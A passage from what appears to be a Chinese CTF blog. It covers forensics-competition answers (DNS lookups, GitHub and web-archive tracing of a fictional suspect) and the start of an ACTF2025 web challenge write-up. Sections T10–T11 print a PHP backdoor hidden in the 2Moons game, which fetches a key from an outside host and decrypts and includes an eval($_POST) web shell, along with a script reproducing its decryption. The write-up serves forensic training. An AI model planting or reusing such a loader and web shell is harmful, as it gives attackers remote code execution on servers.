plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fengbaoliejiu</span><br></pre></td></tr></table></figure><h3 id="T7-3"><a href="#T7-3" class="headerlink" title="T7"></a>T7</h3><blockquote><p>请分析陈某宣传所用域名，该域名DNS记录没有以下那个域名</p><p>A、admin.chen.foren6 B、caidan.chen.foren6 C、fic.chen.foren6 D、hl.chen.foren6</p></blockquote><p>每个都dig一下，感觉这题出错了，应该是有哪个域名才对。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">root@dkhklIcArMYsUrk:~# dig @103.196.38.38 admin.chen.foren6</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; @103.196.38.38 admin.chen.foren6</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 50361</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: ef90ac76795ac75d (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;admin.chen.foren6.             IN      A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">chen.foren6.            20      IN      SOA     ns1.varo. ops.varo.domains. 1 10800 3600 604800 3600</span><br><span class="line"></span><br><span class="line">;; Query time: 399 msec</span><br><span class="line">;; SERVER: 103.196.38.38#53(103.196.38.38) (UDP)</span><br><span class="line">;; WHEN: Wed Apr 30 17:28:49 UTC 2025</span><br><span class="line">;; MSG SIZE  rcvd: 118</span><br><span class="line"></span><br><span class="line">root@dkhklIcArMYsUrk:~# dig @103.196.38.38 caidan.chen.foren6</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; @103.196.38.38 caidan.chen.foren6</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21757</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: 438e343b5ec68a74 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;caidan.chen.foren6.            IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">caidan.chen.foren6.     20      IN      A       20.25.4.26</span><br><span class="line"></span><br><span class="line">;; Query time: 395 msec</span><br><span class="line">;; SERVER: 103.196.38.38#53(103.196.38.38) (UDP)</span><br><span class="line">;; WHEN: Wed Apr 30 17:29:01 UTC 2025</span><br><span class="line">;; MSG SIZE  rcvd: 75</span><br><span class="line"></span><br><span class="line">root@dkhklIcArMYsUrk:~# dig @103.196.38.38 fic.chen.foren6</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; @103.196.38.38 fic.chen.foren6</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32696</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: d289491eaea0d8b4 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;fic.chen.foren6.               IN      A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">chen.foren6.            20      IN      SOA     ns1.varo. ops.varo.domains. 1 10800 3600 604800 3600</span><br><span class="line"></span><br><span class="line">;; Query time: 323 msec</span><br><span class="line">;; SERVER: 103.196.38.38#53(103.196.38.38) (UDP)</span><br><span class="line">;; WHEN: Wed Apr 30 17:29:09 UTC 2025</span><br><span class="line">;; MSG SIZE  rcvd: 116</span><br><span class="line"></span><br><span class="line">root@dkhklIcArMYsUrk:~# dig @103.196.38.38 hl.chen.foren6</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; @103.196.38.38 hl.chen.foren6</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 61316</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">; COOKIE: 571a9893cd2e0023 (echoed)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;hl.chen.foren6.                        IN      A</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">chen.foren6.            20      IN      SOA     ns1.varo. ops.varo.domains. 1 10800 3600 604800 3600</span><br><span class="line"></span><br><span class="line">;; Query time: 327 msec</span><br><span class="line">;; SERVER: 103.196.38.38#53(103.196.38.38) (UDP)</span><br><span class="line">;; WHEN: Wed Apr 30 17:29:15 UTC 2025</span><br><span class="line">;; MSG SIZE  rcvd: 115</span><br></pre></td></tr></table></figure><h3 id="T8-3"><a href="#T8-3" class="headerlink" title="T8"></a>T8</h3><blockquote><p>请分析陈某宣传所用域名，该博客域名最终DNS解析指向的github仓库名为</p></blockquote><p>这里直接上github搜就行。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501013159485.png" alt="image-20250501013159485"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chewhaoN.github.io</span><br></pre></td></tr></table></figure><h3 id="T9-2"><a href="#T9-2" class="headerlink" title="T9"></a>T9</h3><blockquote><p>请分析陈某github账号，陈某对jkroepke&#x2F;2Moons项目增改了几个文件 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501140222948.png" alt="image-20250501140222948"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="T10-2"><a href="#T10-2" class="headerlink" title="T10"></a>T10</h3><blockquote><p>请分析陈某github账号，陈某在修改2Moons过程中提到了什么锅底</p></blockquote><p>查看一下双方差异</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501140326612.png" alt="image-20250501140326612"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;../../../../encrypted.bin&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;aes-256-cbc&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$h</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$i</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$h</span>,<span class="variable">$e</span>,<span class="variable">$b</span>,OPENSSL_RAW_DATA,<span class="variable">$g</span>);</span><br><span class="line"><span class="variable">$j</span>=<span class="title function_ invoke__">sys_get_temp_dir</span>();</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$j</span>.<span class="string">&#x27;/func_&#x27;</span>.<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$k</span>,<span class="string">&quot;&lt;?php\n&quot;</span>.<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$k</span>;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="variable">$k</span>);</span><br><span class="line"><span class="title function_ invoke__">yijuhua</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501140408777.png" alt="image-20250501140408777"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蜂蜜锅底</span><br></pre></td></tr></table></figure><h3 id="T11-2"><a href="#T11-2" class="headerlink" title="T11"></a>T11</h3><blockquote><p>请分析陈某github账号，陈某在游戏2Moons中放置的后门连接码的密码为</p></blockquote><p>分析一下上面的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;https://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;../../../../encrypted.bin&#x27;</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;aes-256-cbc&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$h</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$i</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$h</span>,<span class="variable">$e</span>,<span class="variable">$b</span>,OPENSSL_RAW_DATA,<span class="variable">$g</span>);</span><br><span class="line"><span class="variable">$j</span>=<span class="title function_ invoke__">sys_get_temp_dir</span>();</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$j</span>.<span class="string">&#x27;/func_&#x27;</span>.<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$k</span>,<span class="string">&quot;&lt;?php\n&quot;</span>.<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$k</span>;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="variable">$k</span>);</span><br><span class="line"><span class="title function_ invoke__">yijuhua</span>();</span><br></pre></td></tr></table></figure><p>其中encrypted.bin如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9T8NBGdXI1Xe46fDOsPmrmuhAD9Rk/XQMRukLHJDXMm9wexBjKY/8QQv1OvxCiA87B0ZQ9kFgQiJ0fCquio0EcK5sWr1yUMYrapSWgUXMbD2/P4Qs9lO1cc53rRgZ8lg5r7d21YJkFFkyKJDMAmEjw==</span><br></pre></td></tr></table></figure><p>本地模拟一下，这串代码其实就是写入后门。</p><p>我们先获取一下蜂蜜锅底</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://foren6.atwebpages.com/woyao/eat/%E7%81%AB%E9%94%85/%E8%9C%82%E8%9C%9C%E9%94%85%E5%BA%95.css&quot;</span></span><br><span class="line">save_path = <span class="string">&quot;蜂蜜锅底.css&quot;</span>  <span class="comment"># 保存文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    response.raise_for_status()  <span class="comment"># 检查请求是否成功</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(response.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;文件已下载到: <span class="subst">&#123;save_path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;下载失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后构造一下exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;蜂蜜锅底.css&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;9T8NBGdXI1Xe46fDOsPmrmuhAD9Rk/XQMRukLHJDXMm9wexBjKY/8QQv1OvxCiA87B0ZQ9kFgQiJ0fCquio0EcK5sWr1yUMYrapSWgUXMbD2/P4Qs9lO1cc53rRgZ8lg5r7d21YJkFFkyKJDMAmEjw==&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;aes-256-cbc&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$g</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$h</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$i</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$h</span>,<span class="variable">$e</span>,<span class="variable">$b</span>,OPENSSL_RAW_DATA,<span class="variable">$g</span>);</span><br><span class="line"><span class="variable">$j</span>=<span class="title function_ invoke__">sys_get_temp_dir</span>();</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$j</span>.<span class="string">&#x27;/func_&#x27;</span>.<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到的结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function yijuhua() &#123;</span><br><span class="line">    echo &quot;Kangle) is OK! FICer is good!&quot;;</span><br><span class="line">eval($_POST[ficnb])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么密码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ficnb</span><br></pre></td></tr></table></figure><h3 id="T12-2"><a href="#T12-2" class="headerlink" title="T12"></a>T12</h3><blockquote><p>请访问陈某当前博客，陈某课程的扫码报名地址的域名为</p></blockquote><p>博客主页扫码即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fic.forensix.cn</span><br></pre></td></tr></table></figure><h3 id="T13-2"><a href="#T13-2" class="headerlink" title="T13"></a>T13</h3><blockquote><p>请分析陈某当前博客，通过互联网找到陈某的旧博客网站标题为 </p></blockquote><p>旧博客的网址是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://forensix2025.work.gd/</span><br></pre></td></tr></table></figure><p>但是我们直接访问他会403，这时候我们就可以用到一个网站，记录了大量网站的远古快照。<a href="https://web.archive.org/">https://web.archive.org/</a></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501142322401.png" alt="image-20250501142322401"></p><h3 id="T14-1"><a href="#T14-1" class="headerlink" title="T14"></a>T14</h3><blockquote><p>请分析陈某旧博客，陈某的姓名为 </p></blockquote><p>手机部分可以获得，陈浩北！</p><p>同时上述的图片也是可以得知的。</p><h3 id="T15-1"><a href="#T15-1" class="headerlink" title="T15"></a>T15</h3><blockquote><p>请分析陈某旧博客，陈某的邮箱地址为</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501142634206.png" alt="image-20250501142634206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mailme@chen.foren6</span><br></pre></td></tr></table></figure><h3 id="T16"><a href="#T16" class="headerlink" title="T16"></a>T16</h3><blockquote><p>请分析陈某旧博客，陈某的11位手机号为 </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13170010703</span><br></pre></td></tr></table></figure><h3 id="T17"><a href="#T17" class="headerlink" title="T17"></a>T17</h3><blockquote><p>请分析陈某旧博客，陈某最爱的dota英雄为</p><p>A赏金猎人 B幻影刺客 C斧王 D邪影芳灵</p></blockquote><p>看文章的标题，圣刀会也没我这么厉害。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250501143122517.png" alt="image-20250501143122517"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2025 Web复现</title>
      <link href="/2025/04/29/ACTF2025-Web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/04/29/ACTF2025-Web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>和FIC冲突了，打FIC去了，拿下了初赛一等奖！</p><h2 id="ACTF-upload"><a href="#ACTF-upload" class="headerlink" title="ACTF upload"></a>ACTF upload</h2><p>在&#x2F;upload路由下找到这样的功能点，任意文件读取</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426183801012.png" alt="image-20250426183801012"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span 